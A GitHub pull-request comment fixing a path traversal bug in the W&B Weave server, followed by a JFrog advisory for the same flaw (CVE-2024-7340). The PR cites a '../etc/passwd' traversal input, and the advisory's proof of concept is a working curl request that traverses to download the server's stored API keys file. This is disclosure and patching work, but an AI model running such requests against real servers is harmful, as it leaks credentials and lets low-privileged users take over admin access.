### @anandwandb **[anandwandb](/anandwandb)** commented [May 17, 2024](#issue-2301798687)

This PR addresses a [path traversal vulnerability](https://wandb.atlassian.net/browse/SV-72) in weave\_server.py, discovered by a bug bounty researcher

`abspath = "/" / pathlib.Path(path)` constructs an absolute path by joining the root directory / with the provided path. It ensures that abspath always starts from the root directory, however - it doesn't protect against [path traversal attacks](https://owasp.org/www-community/attacks/Path_Traversal). An attacker could give a path like `../../../../../../../etc/passwd` and read sensitive files outside of the root directory of the webserver.

The patch proposed in this PR checks to ensure that the resolved `requested_path` starts with the `local_artifact_path` - otherwise throws a `403` Error.

Sorry, something went wrong.

# JFSA-2024-001039248 - W&B Weave server remote arbitrary file leak

CVE-2024-7340
| CVSS 8.8

 JFrog Severity:high

Discovered By**Natan Nehorai and Uriya Yavnieli**of the JFrog Security Research Team

Published 31 Jul, 2024 | Last updated 31 Jul, 2024

## [Summary](#summary)

W&B Weave server remote arbitrary file leak and privilege escalation

## [Component](#component)

weave

## [Affected versions](#affected-versions)

(,0.50.7]

## [Description](#description)

The Weave server API allows remote users to fetch files from a specific directory, but due to a lack of input validation, it is possible to traverse and leak arbitrary files remotely. In various common scenarios, this allows a low-privileged user to assume the role of the server admin.

## [PoC](#poc)

```
export WANDB=<WANDB SESSION COOKIE>
export WANDB_SSO=<WANDB SSO SESSION COOKIE>
export SERVER_IP=<WANDB SERVER IP>

curl -s --path-as-is --cookie "wandb=$WANDB; wandb_sso=$WANDB_SSO" "http://$SERVER_IP:8080/__weave/file/vol/weave/cache/../../../vol/mysql/wandb_local/api_keys.ibd" --output apikeys.bin

```
## [Vulnerability Mitigations](#vulnerability-mitigations)
